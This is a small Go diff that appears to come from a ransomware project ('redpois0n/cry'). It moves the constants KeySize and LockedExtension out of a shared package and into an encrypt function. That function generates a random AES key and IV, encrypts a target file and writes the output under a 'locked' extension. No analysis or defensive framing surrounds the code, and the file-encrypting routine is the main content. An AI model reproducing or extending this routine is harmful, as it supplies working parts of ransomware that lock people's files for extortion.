@@ -11,8 +11,6 @@ import (
 	"crypto/cipher"
 
 	"crypto/sha256"
-
-	"github.com/redpois0n/cry/common"
 )
 
 func encrypt(file string, priv *rsa.PrivateKey) {
@@ -22,7 +20,7 @@ func encrypt(file string, priv *rsa.PrivateKey) {
 		panic(err)
 	}
 
-	key := make([]byte, common.KeySize)
+	key := make([]byte, KeySize)
 	rand.Read(key)
 
 	iv := make([]byte, aes.BlockSize)
@@ -50,5 +48,5 @@ func encrypt(file string, priv *rsa.PrivateKey) {
 
 	data = append(header, data...)
 
-	ioutil.WriteFile(file+common.LockedExtension, data, 0777)
+	ioutil.WriteFile(file+LockedExtension, data, 0777)
 }
